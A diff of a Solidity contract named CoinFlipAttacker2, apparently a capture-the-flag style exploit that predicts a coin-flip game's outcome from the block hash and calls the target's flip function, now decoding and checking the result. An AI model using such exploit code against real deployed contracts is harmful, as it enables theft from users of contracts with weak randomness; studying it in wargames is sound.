@@ -17,15 +17,15 @@ contract CoinFlipAttacker2 {
         uint256 coinFlip = blockValue / FACTOR;
         bool side = coinFlip == 1 ? true : false;
 
-        (bool success /*bytes memory data*/, ) = target.call(
+        (bool success, bytes memory data) = target.call(
             abi.encodeWithSignature("flip(bool)", side)
         );
 
         require(success == true);
 
-        // bool result = abi.decode(data, (bool));
+        bool result = abi.decode(data, (bool));
 
-        // require(result == side);
+        require(result == true);
     }
 
     function getLastHash() external view returns (uint256) {
